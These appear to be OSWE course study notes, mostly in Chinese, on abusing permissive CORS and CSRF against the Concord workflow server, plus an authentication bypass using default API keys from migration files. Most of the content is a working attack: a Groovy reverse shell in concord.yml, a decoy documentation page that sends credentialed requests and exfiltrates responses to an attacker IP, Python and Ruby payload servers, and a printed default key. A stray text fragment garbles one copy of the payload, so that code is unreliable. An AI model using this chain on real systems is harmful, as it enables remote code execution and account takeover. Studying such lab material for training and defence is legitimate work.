```http
HTTP/1.1 200 OK
Cache-Control: no-cache
Access-Control-Allow-Origin: https://a.com
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: cache-control,content-language,expires,last-modified,content-range,content-length,accept-ranges
Cache-Control: no-cache
Content-Type: application/json
Vary: Accept-Encoding
Connection: close
Content-Length: 15

{"status":"ok"}
```
> - `Access-Control-Allow-Origin: https://a.com`: 只有 a.com 可以讀 response
> - `Access-Control-Allow-Credentials: true`: Browser 可以帶 cookie/session (authenticated request)
> - `Access-Control-Expose-Headers: content-length`: 允許 JS 讀特定 response header

>[!Important]
>**Preflight Request**:
>不是所有 request 都會直接送，某些 request Browser 會先送 `OPTION`，詢問 **等等能不能送真正 request？**\
>哪些 request 不需要 preflight？\
>Simple Request: `GET`, `HEAD`, `POST`\
>且 Content-Type 必須是
>```
>application/x-www-form-urlencoded
>multipart/form-data
>text/plain
>```
> `PUT`, `DELETE`, `PATCH`, `Custom Header`, `application/json` 會觸發 preflight

嘗試在 dev console 傳送普通 POST
```
fetch("https://example.com",
   {
   	method: 'post',
   	headers: {
   		"Content-type": "application/x-www-form-urlencoded;"
   	}
   })
```
![image](https://hackmd.io/_uploads/r1mnT-ARWl.png)\
![image](https://hackmd.io/_uploads/B13TR-AA-l.png)
> response 被 SOP 阻止，但在 Burp Suite 中查看可以發現 POST request 實際上已經發送

將 content type 變更為非標準值，即 `application/x-www-form-urlencoded`、`multipart/form-data` 或 `text/plain` 以外的任何值
```
fetch("https://example.com",
   {
   	method: 'post',
   	headers: {
   		"Content-type": "application/json;"
   	}
   })
```
![image](https://hackmd.io/_uploads/BJ9r1fR0Zg.png)
![image](https://hackmd.io/_uploads/ByxvyG0Cbg.png)

這是一個 preflight OPTIONS request: 在此 request 中，client（Broswer）試圖傳送一個帶有自訂內容類型標頭的 POST request。由於 Server 沒有回應 CORS Header，因此 SOP 阻止了該請求

現在改向一個設定了 CORS 標頭的網站發送請求。為此使用 test-cors.appspot.com 專門用於測試 CORS 標頭的網站
```
fetch("https://cors-test.appspot.com/test",
   {
   	method: 'post',
   	headers: {
   		"Content-type": "application/json;"
   	}
   })
```
![image](https://hackmd.io/_uploads/B1b7QG0R-l.png)
![image](https://hackmd.io/_uploads/rJbFQGAA-x.png)

```
JS fetch()
    ↓
Browser 判斷：
需要 preflight
    ↓
OPTIONS request
    ↓
Server 回 CORS headers
    ↓
Browser 驗證成功
    ↓
真正 POST request
```

CORS 與攻擊
1. 只想送 request
例如：
- CSRF
- Blind action
- Exfiltration

👉🏻 不需要讀 response，攻擊難度較低
2. 需要讀 response
例如：
- 偷 API data
- 偷 token
- 偷 user info
必須：
- CORS 允許
- Origin 被信任
- credentials=true

👉🏻  難度較高

### Discovering Unsafe CORS Headers
環境範例中，`/api/service/console/whoami`\
![image](https://hackmd.io/_uploads/ryhp8zACZl.png)\
GET 請求不包含 Origin Header 是因為該請求是 same origin GET 請求，不是 CORS 請求\
Response 包含 `Access-Control-Allow-Origin: *` Header，表示 Broswer 不會在跨域請求中發送 cookie

🧠：如果網站有登入功能一定有 session，而 session 一定要靠 cookie 傳遞\
一定存在某種方式讓 browser 願意送 cookie 👉🏻 測試 Origin header\
手動加入 Origin:\
新增 `Origin: https://chw41.com`
![image](https://hackmd.io/_uploads/Skh_dzAR-e.png)
> Server：動態反射 Origin
> > user 送什麼 Origin， Server 就允許什麼 Origin\
> > 並且可以附帶原始設定 `Access-Control-Allow-Credentials: true` 進行利用

測試發送 OPTIONS ，Origin Header 不會複製\
 CORS 漏洞的適用範圍有限，只能讀取 GET 和 POST 請求的回應\
![image](https://hackmd.io/_uploads/BJFNYMCA-e.png)

### SameSite Attribute
指示用戶的瀏覽器發送請求並不難，困難的是指示 broswer 在發送請求時使用 session cookie，並取得回應: SameSite Cookie Attribute

>[!Note]
>SameSite Cookies 詳細介紹可參考 [OSWA Note 1](https://chw41.github.io/b1og/oswa-web-200-instructional-notes---part-1/#samesite-cookies)\
>![image](https://hackmd.io/_uploads/HyvcRMCC-l.png)

SameSite Cookie Attribute 會出現在 HTTP response 的 Set-Cookie header
```http
HTTP/1.1 200 OK
Connection: close
Date: Thu, 01 Apr 2021 20:53:24 GMT
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
Content-Type: application/javascript
Set-Cookie: session=ABCDEFGHIJKLMNO; Path=/; Max-Age=0; SameSite=Lax;
Content-Length: 316
```
SameSite 的目的是限制 Cross-Site Cookie Sending (防止 CSRF)

SameSite 三種模式:
1. Strict: `SameSite=Strict`
同網站內部 navigation 才送 cookie
2. None: `SameSite=None`
所有情境都會送，包括：`iframe`, `img`, `script`, `fetch`, `form`, `cross-origin`
3. Lax: `SameSite=Lax`
- Request method 必須不改變 server state
- 必須是 User initiated navigation，Ex. 點 hyperlink、手動輸入網址
(允許正常瀏覽，但阻止背景請求)

若 Server website 沒設定，由 browser 決定\
![image](https://hackmd.io/_uploads/Hkf7b700We.png)

使用 amdin:admin 登入測試
![image](https://hackmd.io/_uploads/BkWc-XRAWg.png)
> - `authorization: Basic YWRtaW46YWRtaW4=`
> - `Set-Cookie: rememberMe=deleteMe; Path=/; Max-Age=0; Expires=Sat, 09-May-2026 15:16:04 GMT`
> > 沒有 SameSite attribute，因此取決於 browser

### Exploit Permissive CORS and CSRF
目前已確認環境範例 Concord
```
1. Permissive CORS
2. credentials=true
3. 沒有明顯 CSRF token
4. GET 與 simple POST 可被跨站觸發
```
利用 CORS exploit 和 reflected XSS 有點相似：需要讓已登入的 victim 瀏覽 attacker 控制的頁面
- XSS payload 執行在 target domain
- CORS payload 執行在 attacker domain

>[!Note]
>目前限制：\
>前面已測過 Concord 的 OPTIONS response 不會反射 Origin，因此\
>**"不能用會觸發 preflight 的 request"**
>可用：
>```
>GET
>simple POST
>multipart/form-data POST
>application/x-www-form-urlencoded POST
>text/plain POST
>```
>不可用：
>```
>application/json
>custom header
>PUT / DELETE / PATCH
>```

💡 尋找可利用 API: [Concord API documentation](https://concord.walmartlabs.com/docs/api/apikey.html)\
![image](https://hackmd.io/_uploads/rySbDh0AWl.png)
因為不能登入 Concord UI，所以要靠 documentation 找 API

endpoint 類型:
1. GET 可讀敏感資料
2. GET 可改變狀態
3. POST 使用 simple content-type
4. multipart/form-data POST

#### 1. Create API Key
如上圖可看到 Create API Key，使用 POST `application/json`\
這會觸發 OPTIONS preflight\
🥚 Concord 的 OPTIONS CORS 不可利用，因此不能用

尋找下一個 endpoint ...

#### 2. List Existing API keys
![image](https://hackmd.io/_uploads/rkO2D2C0Wl.png)\
GET method 且可以跨站讀取
🥚 只回傳 metadata、不會傳真正 API key\
無法提權

尋找下一個 endpoint ...

#### 3. Process API
若嘗試啟動一個 process 或許可以執行 command\
(因為 Concord 是 workflow server，若可以啟動 process，就可能可以讓 Concord agent 執行 workflow 內容)\
![image](https://hackmd.io/_uploads/rkukj0CRbl.png)

Start Process 使用透過 POST
```
POST /api/v1/process
Content-Type: multipart/form-data
```
> `multipart/form-data` 是 simple request，不需要 preflight\
> > 可以被 CSRF/CORS 利用

在 documentation 後面部分描述如何透過上傳 ZIP 來啟動 Concord process：\
![image](https://hackmd.io/_uploads/rJNooR00Zg.png)

concord.yml 是 Concord DSL file 可以定義:
- configuration
- flows
- profiles
- steps

```
┌──(chw💲CHW)-[~]
└─$ curl --help all
...
 -F, --form <name=content>                         Specify multipart MIME data
...
```
可以透過 /api/v1/process 發送請求來啟動一個 process，請求包含一個名為「archive」的 ZIP 文件，其中包含 concord.yml 
![image](https://hackmd.io/_uploads/Sk5691JJfx.png)

`concord.yml`：Concord DSL file，包含 main flow、configuration、profiles 和其他 declarations

如果 flow 支援 scripting，就可能直接達成 RCE:\
![image](https://hackmd.io/_uploads/Byj5AJJJGx.png)

document 有提供 Groovy Script 範例：\
![image](https://hackmd.io/_uploads/B1Jz1xJJGe.png)
- 先加入 dependency：
```yaml
configuration:
  dependencies:
    - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.8"
```
- 再定義 flow：
```yaml
flows:
  default:
    - script: groovy
```
再用 body 塞入 Groovy code

新增一個包含腳本的主體後再使用 [YML HereDoc](https://lzone.de/#/LZone%20Cheat%20Sheets/YAML)，這樣就不用寫一行程式碼了。使用一個常見的 Groovy 反向 shell 作為腳本，並對其進行格式化以提高可讀性

`concord.yml` Reverse Shell Payload:
```yaml
configuration:
  dependencies:
    - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.8"

flows:
  default:
    - script: groovy
      body: |
         String host = "192.168.45.222";
         int port = 8888;
         String cmd = "/bin/sh";
         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
         Socket s = new Socket(host, port);
         InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
         OutputStream po = p.getOutputStream(), so = s.getOutputStream();
         while (!s.isClosed()) {
         while (pi.available() > 0) so.write(pi.read());
         while (pe.available() > 0) so.write(pe.read());
         while (si.available() > 0) po.write(si.read());
         so.flush();
         po.flush();
         Thread.sleep(50);
         try {
            p.exitValue();
            break;
         } catch (Exception e) {}
         };
         p.destroy();
         s.close();
```
>⚠️TIPS: YAML 對縮排非常敏感\
> payload 中不能亂加 tab

這將成為要傳送到伺服器的 concord.yml\
接著需要建立 delivery mechanism: 創建一個網站來發送此 payload\
(empty HTML)
```html
<html>
	<head>
		<script>
		</script>
	</head>
	<body>
	</body>
</html>
```
需要在 script tags 之間添加一些 JavaScript 用於發送 API 呼叫以傳遞 concord.yml 有效 payload:\
發送 whoami 檢查是否已登入
```html
<script>
	fetch("http://concord:8001/api/service/console/whoami", {
		credentials: 'include'
	})
	.then(async (response) => {
		if(response.status != 401){
			let data = await response.text();
			fetch("http://192.168.45.222/?msg=" + data )
		}else{
			fetch("http://192.168.45.222/?msg=UserNotLoggedIn" )
		}
	})
</script>
```
> 重點是 `credentials: 'include'`
> 會要求 browser 在 cross-origin request 中帶上 cookie

啟動 Attacker Web Server\
![image](https://hackmd.io/_uploads/SJ6JYlyyfg.png)\
透過 Firefox 嘗試存取：\
![image](https://hackmd.io/_uploads/rJn-Feykzg.png)\
![image](https://hackmd.io/_uploads/By7GFlkJfe.png)
> 確實收到 UserNotLoggedIn

若 Debugger simulator 中的使用者已登入 Concord，則會收到：
```JSON
{
  "realm": "apikey",
  "username": "concordAgent",
  "displayName": "concordAgent"
}
```
代表 CORS payload 成功讀取 authenticated response

新增 RCE Function\
接著把 concord.yml 包成 Blob，再用 FormData 送到 /api/v1/process\
關鍵修正點是 fetch options 必須包含:
```javascript
method: "POST",
credentials: "include",
body: fd
```
完整 function：
```javascript
function rce() {
    var ymlBlob = new Blob([yml], { type: "application/yml" });
    var fd = new FormData();

    fd.append("concord.yml", ymlBlob, "concord.yml");

    fetch("http://concord:8001/api/v1/process", {
        method: "POST",
        credentials: "include",
        body: fd
    })
    .then(response => response.text())
    .then(data => {
        fetch("http://192.168.45.222/?msg=" + encodeURIComponent(data));
    })
    .catch(err => {
        fetch("http://192.168.45.222/?err=" + encodeURIComponent(err));
    });
}
```
修改 whoami 邏輯\
若 victim 已登入，就呼叫 rce()：
```javascript
fetch("http://concord:8001/api/service/console/whoami", {
    credentials: 'include'
})
.then(async (response) => {
    if(response.status != 401){
        let data = await response.text();
        fetch("http://192.168.45.222/?msg=" + encodeURIComponent(data));
        rce();
    }else{
        fetch("http://192.168.45.222/?msg=UserNotLoggedIn");
    }
})
```
完整 index.html
```html
<html>
<head>
  <title>Concord Documentation</title>
</head>
<body>
  <h2>Concord Workflow Documentation</h2>
  <p>Loading latest Concord workflow examples...</p>

  <script>
var attacker = "http://KALI_IP";

var yml = `configuration:
  dependencies:
    - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.8"

flows:
  default:
    - script: groovy
      body: |
         String host = "KALI_IP";
         int port = 8888;
         String cmd = "/bin/sh";
         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
         Socket s = new Socket(host, port);
         InputStream pi = p.getInpu
         
         開啟 HTTP Service
         ```


```tStream(), pe = p.getErrorStream(), si = s.getInputStream();
         OutputStream po = p.getOutputStream(), so = s.getOutputStream();
         while (!s.isClosed()) {
         while (pi.available() > 0) so.write(pi.read());
         while (pe.available() > 0) so.write(pe.read());
         while (si.available() > 0) po.write(si.read());
         so.flush();
         po.flush();
         Thread.sleep(50);
         try {
            p.exitValue();
            break;
         } catch (Exception e) {}
         };
         p.destroy();
         s.close();
`;

function log(msg) {
  fetch(attacker + "/?msg=" + encodeURIComponent(msg));
}

function rce() {
  var ymlBlob = new Blob([yml], { type: "application/yml" });
  var fd = new FormData();

  fd.append("concord.yml", ymlBlob, "concord.yml");

  fetch("http://concord:8001/api/v1/process", {
    method: "POST",
    credentials: "include",
    body: fd
  })
  .then(function(response) {
    return response.text();
  })
  .then(function(data) {
    log(data);
  })
  .catch(function(err) {
    log("ERROR: " + err);
  });
}

fetch("http://concord:8001/api/service/console/whoami", {
  credentials: "include"
})
.then(async function(response) {
  if (response.status != 401) {
    let data = await response.text();
    log(data);
    rce();
  } else {
    log("UserNotLoggedIn");
  }
})
.catch(function(err) {
  log("WHOAMI ERROR: " + err);
});
  </script>
</body>
</html>
```

開啟 HTTP Service
```
┌──(chw💲CHW)-[~/Offsec/OSWE/concord]
└─$ sudo python3 -m http.server 80
[2026-05-11 08:14:31] sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
開啟監聽 port
```
┌──(chw💲CHW)-[~/Offsec/OSWE]
└─$ nc -nvlp 8888
[2026-05-11 08:14:13] nc -nvlp 8888
listening on [any] 8888 ...

```
再次利用 Debugger simulator 觸發
![image](https://hackmd.io/_uploads/H1D5nryyGx.png)
```
192.168.209.253 - - [07/Apr/2021 20:27:25] "GET / HTTP/1.1" 200 -
192.168.209.253 - - [07/Apr/2021 20:27:25] "GET /?msg={%20%20%22realm%22%20:%20%22apikey%22,%20%20%22username%22%20:%20%22concordAgent%22,%20%20%22displayName%22%20:%20%22concordAgent%22} HTTP/1.1" 200 -
192.168.209.253 - - [07/Apr/2021 20:27:25] "GET /?msg={%20%20%22instanceId%22%20:%20%22a85f6fef-69cb-4127-975c-9aa97584415e%22,%20%20%22ok%22%20:%20true} HTTP/1.1" 200 -
```
(nc)
```
┌──(chw💲CHW)-[~/Offsec/OSWE]
└─$ nc -nvlp 8888
[2026-05-11 08:14:13] nc -nvlp 8888
listening on [any] 8888 ...
connect to [{Kali IP}}] from (UNKNOWN) [192.168.120.132] 39888
whoami
concord

ls -alh
total 28K
drwxr-xr-x 4 concord concord 4.0K Apr  8 00:27 .
drwx------ 3 concord concord 4.0K Apr  8 00:27 ..
drwxr-xr-x 2 concord concord 4.0K Apr  8 00:27 .concord
drwxr-xr-x 3 concord concord 4.0K Apr  8 00:27 _attachments
-rw-r--r-- 1 concord concord   36 Apr  8 00:27 _instanceId
-rw-r--r-- 1 concord concord  978 Apr  8 00:27 _main.json
-rw-r--r-- 1 concord concord  956 Apr  8 00:27 concord.yml
```
- Build a payload in Python.
```python
#!/usr/bin/env python3

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

KALI_IP = "KALI_IP"
PORT = 80

HTML = f"""<!doctype html>
<html>
<head>
  <title>Concord Documentation</title>
</head>
<body>
<h2>Concord Workflow Documentation</h2>
<p>Loading latest Concord workflow examples...</p>

<script>
var attacker = "http://{KALI_IP}";

var yml = `configuration:
  dependencies:
    - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.8"

flows:
  default:
    - script: groovy
      body: |
         String host = "{KALI_IP}";
         int port = 9000;
         String cmd = "/bin/sh";
         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
         Socket s = new Socket(host, port);
         InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
         OutputStream po = p.getOutputStream(), so = s.getOutputStream();
         while (!s.isClosed()) {{
         while (pi.available() > 0) so.write(pi.read());
         while (pe.available() > 0) so.write(pe.read());
         while (si.available() > 0) po.write(si.read());
         so.flush();
         po.flush();
         Thread.sleep(50);
         try {{
            p.exitValue();
            break;
         }} catch (Exception e) {{}}
         }};
         p.destroy();
         s.close();
`;

function log(msg) {{
  fetch(attacker + "/?msg=" + encodeURIComponent(msg));
}}

function rce() {{
  var ymlBlob = new Blob([yml], {{ type: "application/yml" }});
  var fd = new FormData();
  fd.append("concord.yml", ymlBlob, "concord.yml");

  fetch("http://concord:8001/api/v1/process", {{
    method: "POST",
    credentials: "include",
    body: fd
  }})
  .then(r => r.text())
  .then(data => log(data))
  .catch(err => log("RCE ERROR: " + err));
}}

fetch("http://concord:8001/api/service/console/whoami", {{
  credentials: "include"
}})
.then(async function(response) {{
  if (response.status != 401) {{
    let data = await response.text();
    log(data);
    rce();
  }} else {{
    log("UserNotLoggedIn");
  }}
}})
.catch(err => log("WHOAMI ERROR: " + err));
</script>
</body>
</html>
"""


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)

        if parsed.query:
            print(f"[+] Callback: {parsed.query}")

        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(HTML.encode())

    def log_message(self, fmt, *args):
        print("[HTTP]", fmt % args)


if __name__ == "__main__":
    print(f"[+] Serving payload on http://0.0.0.0:{PORT}")
    HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
```
- Build a payload in Ruby.
```ruby
#!/usr/bin/env ruby

require 'webrick'
require 'uri'

KALI_IP = "KALI_IP"
PORT = 80

html = <<~HTML
<!doctype html>
<html>
<head>
  <title>Concord Documentation</title>
</head>
<body>
<h2>Concord Workflow Documentation</h2>
<p>Loading latest Concord workflow examples...</p>

<script>
var attacker = "http://#{KALI_IP}";

var yml = `configuration:
  dependencies:
    - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.8"

flows:
  default:
    - script: groovy
      body: |
         String host = "#{KALI_IP}";
         int port = 9000;
         String cmd = "/bin/sh";
         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
         Socket s = new Socket(host, port);
         InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
         OutputStream po = p.getOutputStream(), so = s.getOutputStream();
         while (!s.isClosed()) {
         while (pi.available() > 0) so.write(pi.read());
         while (pe.available() > 0) so.write(pe.read());
         while (si.available() > 0) po.write(si.read());
         so.flush();
         po.flush();
         Thread.sleep(50);
         try {
            p.exitValue();
            break;
         } catch (Exception e) {}
         };
         p.destroy();
         s.close();
`;

function log(msg) {
  fetch(attacker + "/?msg=" + encodeURIComponent(msg));
}

function rce() {
  var ymlBlob = new Blob([yml], { type: "application/yml" });
  var fd = new FormData();
  fd.append("concord.yml", ymlBlob, "concord.yml");

  fetch("http://concord:8001/api/v1/process", {
    method: "POST",
    credentials: "include",
    body: fd
  })
  .then(r => r.text())
  .then(data => log(data))
  .catch(err => log("RCE ERROR: " + err));
}

fetch("http://concord:8001/api/service/console/whoami", {
  credentials: "include"
})
.then(async function(response) {
  if (response.status != 401) {
    let data = await response.text();
    log(data);
    rce();
  } else {
    log("UserNotLoggedIn");
  }
})
.catch(err => log("WHOAMI ERROR: " + err));
</script>
</body>
</html>
HTML

server = WEBrick::HTTPServer.new(
  Port: PORT,
  BindAddress: "0.0.0.0"
)

server.mount_proc "/" do |req, res|
  puts "[+] Callback: #{req.query_string}" if req.query_string

  res.status = 200
  res["Content-Type"] = "text/html"
  res.body = html
end

trap("INT") { server.shutdown }

puts "[+] Serving payload on http://0.0.0.0:#{PORT}"
server.start
```
## Authentication Bypass: Round Two - Insecure Defaults
上述已利用 CORS + CSRF 達成 RCE
🥚 現代瀏覽器逐漸強化：
* SameSite
* CORS behavior
* preflight handling

也就是：
* 預設帳號
* 預設 API key
* 安裝後未重新產生的 secret
* migration 中殘留的敏感資料

[環境範例]
目前使用的 Concord 版本存在對寬鬆型 CORS 的漏洞，接著需要利用 CSRF 漏洞並不需要寬鬆型 CORS 標頭
透過 SSH 連接到 Concord 伺服器，並執行以下命令來停止舊版本的 Concord 啟動新版
![image](https://hackmd.io/_uploads/r1zbCSykzg.png)


把新版 Concord source code 從 target 拉回 Kali
```
rsync -az student@concord:/home/student/concord-1.83.0/ concord/
```
![image](https://hackmd.io/_uploads/BJ1wg8yyfl.png)

從啟動流程開始看，Concord 的啟動 script：`server/dist/src/assembly/start.sh`\
```bash
┌──(chw💲CHW)-[~/Offsec/OSWE/concord/concord]
└─$ cat server/dist/src/assembly/start.sh
[2026-05-11 08:50:33] cat server/dist/src/assembly/start.sh
#!/bin/bash

BASE_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

MAIN_CLASS="com.walmartlabs.concord.server.dist.Main"
if [[ "${CONCORD_COMMAND}" = "migrateDb" ]]; then
    MAIN_CLASS="com.walmartlabs.concord.server.MigrateDB"
fi
...

exec java \
${CONCORD_JAVA_OPTS} \
-Dfile.encoding=UTF-8 \
-Djava.net.preferIPv4Stack=true \
-Djava.security.egd=file:/dev/./urandom \
-Dollie.conf=${CONCORD_CFG_FILE} \
-cp "${BASE_DIR}/lib/*:${BASE_DIR}/ext/*:${BASE_DIR}/classes" \
"${MAIN_CLASS}"
```
這裡有兩個 main class：`com.walmartlabs.concord.server.dist.Main`, `com.walmartlabs.concord.server.MigrateDB`\
MigrateDB 負責 database migration

>[!Tip]
>Database migration 常包含：
>- table schema
>- default data
>- seed users
>- default API keys
>- historical sensitive values

在搜尋 MigrateDB 中可以找到
```
grep -R "class MigrateDB" -n .
```
![image](https://hackmd.io/_uploads/ByLiBUJ1Me.png)\
`server/impl/src/main/java/com/walmartlabs/concord/server/MigrateDB.java` 
```java
public class MigrateDB {

    @Inject
    @MainDB
    private DataSource dataSource;

    public static void main(String[] args) throws Exception {
        EnvironmentSelector environmentSelector = new EnvironmentSelector();
        Config cfg = new ConfigurationProcessor("concord-server", environmentSelector.select()).process();

        Injector injector = Guice.createInjector(
                new WireModule(
                        new SpaceModule(new URLClassSpace(MigrateDB.class.getClassLoader()), BeanScanning.CACHE),
                        new OllieConfigurationModule("com.walmartlabs.concord.server", cfg),
                        new DatabaseModule()));

        new MigrateDB().run(injector);
    }
...
}
```
> 載入 DatabaseModule 位於 `server/db/src/main/java/com/walmartlabs/concord/db`

查看 migration resources: `server/db/src/main/`\
![image](https://hackmd.io/_uploads/Hysr88Jyfe.png)\
java 資料夾包含程式碼、resources 資料夾包含各種 XML 文檔，其中包括 liquibase.xml 文件

>[!Note]
>**[Liquibase](https://docs.liquibase.com/)**\
>liquibase.xml 與各版本 XML 是 database migrations
>負責 建立資料表、修改欄位、插入預設資料、更新版本

翻 v0.0.1.xml 文件：
```xml
<createTable tableName="USERS">
    <column name="USER_ID" type="varchar(36)">
        <constraints primaryKey="true" nullable="false"/>
    </column>
    <column name="USERNAME" type="varchar(64)">
        <constraints unique="true" nullable="false"/>
    </column>
</createTable>

...

<insert tableName="API_KEYS">
    <column name="KEY_ID">d5165ca8-e8de-11e6-9bf5-136b5db23c32</column>
    <!-- original: auBy4eDWrKWsyhiDp3AQiw -->
    <column name="API_KEY">KLI+ltQThpx6RQrOc2nDBaM/8tDyVGDw+UVYMXDrqaA</column>
    <column name="USER_ID">230c5c9c-d9a7-11e6-bcfd-bb681c07b26c</column>
</insert>
```
> API_KEY 欄位裡的是 hash 後的值\
>comment 裡的 original 才可能是真正 API key

測試 Hash 值：\
![image](https://hackmd.io/_uploads/rJ4XFLk1zg.png)
> 401 合理

測試 comment 值：\
![image](https://hackmd.io/_uploads/ByoLFLyJGg.png)
> 猜測：
>> - 舊 migration
>> - 後續 migration 刪除或取代
>> - 該 user/key 已不存在
>> - key hashing scheme 改變

搜尋其他 API_KEYS insert
```
grep -rl '<insert tableName="API_KEYS">' ./
```
![image](https://hackmd.io/_uploads/rkK3KIkyGx.png)

- v0.69.0.xml
```xml
<property name="concordAgentUserId" value="d4f123c1-f8d4-40b2-8a12-b8947b9ce2d8"/>

<insert tableName="USERS">
    <column name="USER_ID">${concordAgentUserId}</column>
    <column name="USERNAME">concordAgent</column>
    <column name="USER_TYPE">LOCAL</column>
</insert>

<insert tableName="API_KEYS">
    <!-- "O+JMYwBsU797EKtlRQYu+Q" -->
    <column name="API_KEY">1sw9eLZ41EOK4w/iV3jFnn6cqeAMeFtxfazqVY04koY</column>
    <column name="USER_ID">${concordAgentUserId}</column>
</insert>
```
測試：\
![image](https://hackmd.io/_uploads/r1syq8y1zx.png)
> Bingo

沒有使用正常帳密，只用 migration 中留下的 default API key 就登入 API\
🥚 Concord doc 指出 `?useApiKey=true` 可以透過 API token 登入\
![image](https://hackmd.io/_uploads/HkHo9U1yGg.png)\
利用 API token 成功登入：\
![image](https://hackmd.io/_uploads/SJYkoLJJGe.png)

# Server-Side Request Forgery
>[!Caution]
> HackMD 筆記長度限制，接續 [[OSWE, WEB-300] Instructional notes - Part 5](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-5/)
   
# [Link to: "[OSWE, WEB-300] Instructional notes - Part 5"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-5/)
# [Link to: "[OSWE, WEB-300] Instructional notes - Part 6"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-6/)
